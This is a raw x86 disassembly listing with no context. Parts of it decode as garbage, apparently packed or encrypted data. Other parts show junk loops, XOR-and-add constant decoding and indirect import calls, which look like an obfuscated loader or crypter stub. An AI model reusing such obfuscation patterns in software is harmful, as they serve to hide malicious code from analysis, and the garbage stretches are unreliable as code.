  4061a9:	jbe    0x406206
  4061ab:	retf   0x1894
  4061ae:	jle    0x4061b5
  4061b0:	pop    edx
  4061b1:	std    
  4061b2:	pop    ss
  4061b3:	inc    edx
  4061b4:	adc    eax,0xa93cc2c7
  4061b9:	outs   dx,BYTE PTR fs:[esi]
  4061bb:	cmp    DWORD PTR [ebx-0x3975e41d],esp
  4061c1:	sahf   
  4061c2:	(bad)  
  4061c3:	js     0x406201
  4061c5:	sar    bl,cl
  4061c7:	in     eax,0x3d
  4061c9:	cmp    edi,DWORD PTR [esi-0x78900d69]
  4061cf:	jecxz  0x4061fc
  4061d1:	push   ebp
  4061d2:	scas   eax,DWORD PTR es:[edi]
  4061d3:	inc    esp
  4061d4:	and    ah,cl
  4061d6:	les    eax,FWORD PTR [ebx]
  4061d8:	leave  
  4061d9:	mov    cs,WORD PTR ds:0x28b4263f
  4061df:	(bad)  
  4061e1:	sar    BYTE PTR [edi],1
  4061e3:	cmp    DWORD PTR [ebx-0x7],esp
  4061e6:	mov    al,ds:0xe48683ac
  4061eb:	xchg   DWORD PTR [ecx+0x756222ca],esp
  4061f1:	sub    eax,0x9be15531
  4061f6:	cmp    ebx,DWORD PTR [esi]
  4061f8:	aam    0xce
  4061fa:	pop    ebx
  4061fb:	jmp    0xff14ef90
  406200:	or     ch,ah
  406202:	idiv   esi
  406204:	sbb    BYTE PTR [eax],dh
  406206:	or     DWORD PTR [eax+0x7072513e],eax
  40620c:	fcmovne st,st(4)
  40620e:	mov    dl,0xf6
  406210:	pop    esi
  406211:	jns    0x406205
  406213:	pop    ebp
  406214:	rol    BYTE PTR [eax-0x12],cl
  406217:	add    BYTE PTR [ebx-0x24bf631],al
  40621d:	dec    ecx
  40621e:	sbb    al,0xf
  406220:	push   eax
  406221:	rol    DWORD PTR [esi],0x65
  406224:	mov    ds:0xbb36b120,eax
  406229:	clc    
  40622a:	pop    ebp
  40622b:	out    dx,eax
  40622c:	into   
  40622d:	mov    ebp,DWORD PTR [edi+0x43cfdc79]
  406233:	repnz sbb DWORD PTR [eax],0x36218822
  40623a:	test   BYTE PTR [ebx],ah
  40623c:	pop    ss
  40623d:	and    al,0x2e
  40623f:	jg     0x4062bf
  406241:	jecxz  0x4061eb
  406243:	adc    eax,esp
  406245:	xchg   bh,al
  406247:	iret   
  406248:	mov    ah,0xc4
  40624a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624b:	push   0x5
  40624d:	sub    eax,0x8029e408
  406252:	xchg   edi,eax
  406253:	lea    edi,[edi]
  406255:	sub    esp,DWORD PTR [edi]
  406257:	push   ebx
  406258:	scas   al,BYTE PTR es:[edi]
  406259:	fild   DWORD PTR [edi+0x60]
  40625c:	popf   
  40625d:	ret    
  40625e:	(bad)  
  40625f:	cld    
  406260:	or     BYTE PTR [edx],dl
  406262:	out    dx,eax
  406263:	pop    esp
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	lahf   
  406312:	icebp  
  406313:	and    al,0x8b
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	leave  
  40631e:	fsubr  QWORD PTR [edi+0x6a]
  406321:	xchg   al,bh
  406323:	mov    eax,ds:0xae66957a
  406328:	imul   edx,DWORD PTR [ebx+esi*4-0x3515fb65],0xc
  406330:	test   al,ah
  406332:	es pop eax
  406334:	pop    es
  406335:	pop    ebp
  406336:	dec    DWORD PTR [ebx+0x31]
  406339:	add    ch,ah
  40633b:	aas    
  40633c:	mov    ebx,DWORD PTR [ecx]
  40633e:	dec    edx
  40633f:	cmp    ebx,DWORD PTR fs:[eax-0x4d]
  406343:	dec    ecx
  406344:	mov    cl,0x2
  406346:	adc    al,0xc6
  406348:	aam    0x53
  40634a:	ins    DWORD PTR es:[edi],dx
  40634b:	cs pop ss
  40634d:	pop    esp
  40634e:	and    BYTE PTR [esp+ecx*1-0x7b527607],cl
  406355:	pop    es
  406356:	icebp  
  406357:	jae    0x4063c5
  406359:	jge    0x406333
  40635b:	pop    ecx
  40635c:	mov    esi,0x240864b5
  406361:	jb     0x406346
  406363:	nop
  406364:	test   DWORD PTR [ebx-0x7f563eb8],0xdad22459
  40636e:	clc    
  40636f:	popa   
  406370:	call   0x785d:0x58ce2a5e
  406377:	add    DWORD PTR [ebx],edx
  406379:	jne    0x4063fa
  40637b:	enter  0x30fa,0xf8
  40637f:	jl     0x406306
  406381:	jae    0x4063f7
  406383:	mov    ds:0x83c61616,al
  406388:	sbb    al,0x69
  40638a:	add    esi,edx
  40638c:	(bad)  
  40638d:	out    dx,al
  40638e:	fisttp WORD PTR [edx]
  406390:	jg     0x406375
  406392:	xchg   edi,eax
  406393:	mov    ebx,0x74daae00
  406398:	das    
  406399:	js     0x406380
  40639b:	cmp    eax,0x565a2468
  4063a0:	popf   
  4063a1:	pop    ebp
  4063a2:	sbb    al,0xe9
  4063a4:	or     ecx,ebp
  4063a6:	jmp    0x99dedfdf
  4063ab:	lock shr edi,cl
  4063ae:	xchg   esp,eax
  4063af:	jecxz  0x40636c
  4063b1:	cmp    ecx,DWORD PTR [esp+esi*8]
  4063b4:	and    ebx,DWORD PTR [ebx+ebp*4]
  4063b7:	and    BYTE PTR [edx+0x27422316],0xdf
  4063be:	push   0xffffffee
  4063c0:	repnz xchg ebx,eax
  4063c2:	jg     0x40640e
  4063c4:	div    BYTE PTR [edx-0x12882be]
  4063ca:	(bad)  
  4063cb:	retf   0xb778
  4063ce:	cli    
  4063cf:	jae    0x6cb0b9e3
  4063d5:	xor    eax,0x5194cf04
  4063da:	in     eax,0xdf
  4063dc:	aaa    
  4063dd:	cmp    ah,BYTE PTR [edx+0x14]
  4063e0:	mov    dl,bl
  4063e2:	lds    ebx,FWORD PTR [edx]
  4063e4:	pop    eax
  4063e5:	xchg   edi,eax
  4063e6:	clc    
  4063e7:	sub    eax,0xacfe4347
  4063ec:	mov    al,0x3
  4063ee:	ret    0x4673
  4063f1:	ins    BYTE PTR es:[di],dx
  4063f3:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4063f5:	clc    
  4063f6:	repz hlt 
  4063f8:	jecxz  0x4063a7
  4063fa:	in     al,dx
  4063fb:	(bad)  
  4063fc:	fdiv   QWORD PTR [eax-0x79]
  4063ff:	int3   
  406400:	imul   edi,DWORD PTR [eax-0xf4116ab],0xffffff96
  406407:	outs   dx,BYTE PTR ds:[esi]
  406408:	pop    esi
  406409:	ficom  DWORD PTR [ecx+edx*2]
  40640c:	pop    ebx
  40640d:	stos   DWORD PTR es:[edi],eax
  40640e:	jg     0x4063d0
  406410:	inc    edx
  406411:	loopne 0x4063c7
  406413:	inc    esi
  406414:	int3   
  406415:	test   DWORD PTR [esi],0x298115b3
  40641b:	xchg   edi,eax
  40641c:	xor    eax,0xe5330e96
  406421:	fs ja  0x4063a6
  406424:	pusha  
  406425:	stc    
  406426:	retf   0x95a
  406429:	jb     0x406458
  40642b:	ret    0x6276
  40642e:	mov    esi,0x87774e58
  406433:	int    0xd3
  406435:	inc    eax
  406436:	sbb    BYTE PTR [ebp+0x3],ch
  406439:	inc    ebx
  40643a:	imul   ebx,DWORD PTR [ebp+0x711d13ca],0x5b
  406441:	popw   es
  406443:	test   al,0x70
  406445:	aas    
  406446:	fild   WORD PTR [edx-0x57]
  40644a:	sahf   
  40644b:	inc    esp
  40644c:	push   ebp
  40644d:	dec    ebx
  40644e:	mov    BYTE PTR [eax+esi*2-0x52bcc8e7],dl
  406455:	xchg   ebx,eax
  406456:	into   
  406457:	jb     0x40646d
  406459:	mov    cs,WORD PTR [esi+edi*8-0x52f98bde]
  406460:	xchg   ebx,eax
  406461:	outs   dx,DWORD PTR ds:[esi]
  406462:	fsub   QWORD PTR [ecx]
  406464:	inc    esp
  406465:	push   0xffffff8b
  406467:	xchg   esp,eax
  406468:	pop    edi
  406469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40646a:	cmp    BYTE PTR [edx+0x2],0xc8
  40646e:	sbb    eax,0x84704204
  406473:	out    dx,al
  406474:	int    0x19
  406476:	int3   
  406477:	xchg   ecx,eax
  406478:	stos   DWORD PTR es:[edi],eax
  406479:	cmp    esp,DWORD PTR [esi+ebp*1]
  40647c:	xchg   esi,eax
  40647d:	xchg   BYTE PTR fs:[ebp+0x3f],ch
  406481:	jbe    0x406460
  406483:	loope  0x40642b
  406485:	mov    esi,0x1a1d1538
  40648a:	inc    eax
  40648b:	dec    eax
  40648c:	repz xor BYTE PTR [ecx+0x70],dh
  406490:	pop    edi
  406491:	imul   esp,DWORD PTR [esi],0x15311aa1
  406497:	jae    0x4064d7
  406499:	adc    BYTE PTR [ebx],0x28
  40649c:	das    
  40649d:	pop    ds
  40649e:	mov    ebp,0xa50517d5
  4064a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064a4:	xor    dl,BYTE PTR [ebp+0x74331702]
  4064aa:	test   al,0x75
  4064ac:	popa   
  4064ad:	xchg   ebp,eax
  4064ae:	(bad)  
  4064af:	mov    al,ds:0x192e5700
  4064b4:	mov    ds:0xbf113816,al
  4064b9:	or     edi,ebx
  4064bb:	aas    
  4064bc:	mov    ds:0xb13e56b,al
  4064c1:	bound  ecx,QWORD PTR [edx+0x3b]
  4064c4:	pop    eax
  4064c5:	cmp    dl,dl
  4064c7:	(bad)  
  4064c8:	jne    0x40653b
  4064ca:	inc    esi
  4064cb:	mov    ds:0x78dc63c0,eax
  4064d0:	dec    ebp
  4064d1:	or     eax,DWORD PTR [edi-0x2c]
  4064d4:	pop    ds
  4064d5:	adc    dh,0x6
  4064d8:	jge    0x406546
  4064da:	das    
  4064db:	mov    eax,ds:0xbf9d1860
  4064e0:	jne    0x40652a
  4064e2:	das    
  4064e3:	shr    DWORD PTR [edi-0x73e7131d],0xd
  4064ea:	popf   
  4064eb:	sar    BYTE PTR [ecx-0x17],cl
  4064ee:	xor    eax,0x2d3120f6
  4064f3:	dec    ebx
  4064f4:	mov    al,ds:0x8b499b77
  4064f9:	mov    al,ds:0x65a74cf6
  4064fe:	lods   al,BYTE PTR ds:[esi]
  4064ff:	test   eax,0xf98af789
  406504:	ret    
  406505:	jecxz  0x4064da
  406507:	sub    al,0x17
  406509:	push   esi
  40650a:	dec    esi
  40650b:	mov    ecx,0x67b46b41
  406510:	(bad)
  406514:	or     edx,DWORD PTR [eax]
  406516:	out    0xef,al
  406518:	mov    ch,0xb9
  40651a:	add    esp,ecx
  40651c:	std    
  40651d:	xchg   ebx,eax
  40651e:	pop    esp
  40651f:	popf   
  406520:	cld    
  406521:	pusha  
  406522:	or     eax,0x997520c0
  406527:	adc    cl,ch
  406529:	(bad)  
  40652a:	push   cs
  40652b:	in     eax,0xe3
  40652d:	mov    al,0x43
  40652f:	push   cs
  406530:	pop    ebx
  406531:	in     al,0x96
  406533:	pushf  
  406534:	lods   eax,DWORD PTR ds:[esi]
  406535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406536:	jno    0x4065ab
  406538:	pusha  
  406539:	mov    BYTE PTR [eax-0x573ca58c],cl
  40653f:	cwde   
  406540:	(bad)  
  406541:	dec    esi
  406542:	add    eax,0x9bfc69ea
  406547:	xor    al,0x55
  406549:	mov    bh,0x81
  40654b:	add    eax,0x71b350e1
  406550:	xor    eax,DWORD PTR [edx-0x2e]
  406553:	mov    bl,0x38
  406555:	int    0x9e
  406557:	xchg   ecx,eax
  406558:	pop    esi
  406559:	jns    0x406566
  40655b:	idiv   DWORD PTR [esi+0x3088b18e]
  406561:	cmp    BYTE PTR [ebx+0x17],bl
  406564:	lahf   
  406565:	cmp    ebx,eax
  406567:	ss jle 0x4065b9
  40656a:	pop    ebx
  40656b:	retf   0xabcc
  40656e:	push   0x6476b797
  406573:	mov    ecx,0x4df61deb
  406578:	xor    cl,bl
  40657a:	shl    BYTE PTR [ebx+0x1c],cl
  40657d:	adc    eax,0xffffffe2
  406580:	inc    edx
  406581:	jnp    0x4065b1
  406583:	inc    edi
  406584:	sub    DWORD PTR [edi+0x7b433b5f],ebp
  40658a:	int3   
  40658b:	push   0x5775698c
  406590:	mov    esp,0x7c31f0e0
  406595:	fimul  DWORD PTR [esi-0xa]
  406598:	cmp    al,0x14
  40659a:	sub    DWORD PTR [esi-0xe103f36],ebp
  4065a0:	(bad)  
  4065a2:	sbb    BYTE PTR [ebp+0x52],dl
  4065a5:	mov    ebx,0x2af42ef0
  4065aa:	rcr    DWORD PTR [esi-0x67],1
  4065ad:	iret   
  4065ae:	iret   
  4065af:	js     0x4065a5
  4065b1:	enter  0x5633,0x1a
  4065b5:	add    ah,dh
  4065b7:	mov    bh,0x7b
  4065b9:	and    edx,DWORD PTR [ecx]
  4065bb:	and    ch,dl
  4065bd:	(bad)  
  4065be:	pop    esp
  4065bf:	mov    edi,0x84867940
  4065c4:	pop    ss
  4065c5:	shr    ebp,0x6
  4065c8:	pusha  
  4065c9:	loopne 0x4065ed
  4065cb:	retf   0xdf21
  4065ce:	jmp    0xb5ed181c
  4065d3:	sbb    DWORD PTR [ebx],0xffffff92
  4065d6:	push   esi
  4065d7:	test   DWORD PTR ds:0xa04f0137,ebp
  4065dd:	mov    bh,0xec
  4065df:	add    al,0xd9
  4065e1:	stos   BYTE PTR es:[edi],al
  4065e2:	cmc    
  4065e3:	jb     0x4065a6
  4065e5:	fidiv  DWORD PTR ds:0x8a6c4aa9
  4065eb:	jp     0x40660a
  4065ed:	xor    cl,ah
  4065ef:	xor    al,0x36
  4065f1:	hlt    
  4065f2:	xchg   edi,eax
  4065f3:	add    DWORD PTR [esi],eax
  4065f5:	cmp    ah,BYTE PTR [ebx+0x7b794341]
  4065fb:	mov    ds:0xc4bbd42b,al
  406600:	mov    dl,BYTE PTR [ecx-0x467a16a6]
  406606:	mov    bh,0x9c
  406608:	dec    esi
  406609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40660a:	inc    ebp
  40660b:	stos   BYTE PTR es:[edi],al
  40660c:	xchg   ecx,eax
  40660d:	bound  esp,QWORD PTR [eax+0x340e4b81]
  406613:	mov    ah,0x57
  406615:	or     BYTE PTR [ecx-0x38],dh
  406618:	stos   DWORD PTR es:[edi],eax
  406619:	mov    ds:0x4d442afa,eax
  40661e:	mov    cl,0x95
  406620:	(bad)  
  406621:	iret   
  406622:	ins    DWORD PTR es:[edi],dx
  406623:	in     eax,dx
  406624:	sbb    esi,DWORD PTR [edi+0x78]
  406627:	sbb    ecx,DWORD PTR [edi+0x15]
  40662a:	mov    al,ds:0xa946567b
  40662f:	adc    BYTE PTR [eax+0x30],ch
  406632:	lods   al,BYTE PTR ds:[esi]
  406633:	js     0x4065e5
  406635:	push   cs
  406636:	pop    edi
  406637:	adc    DWORD PTR [edx],edx
  406639:	aam    0x2
  40663b:	in     al,dx
  40663c:	shl    dh,cl
  40663e:	xor    al,0x74
  406640:	fs into 
  406642:	add    dl,bh
  406644:	(bad)  
  406645:	(bad)  
  406646:	or     bl,BYTE PTR [edx-0x80]
  406649:	fs mov bl,0x90
  40664c:	adc    bl,dl
  40664e:	sub    bh,bh
  406650:	shr    cl,1
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
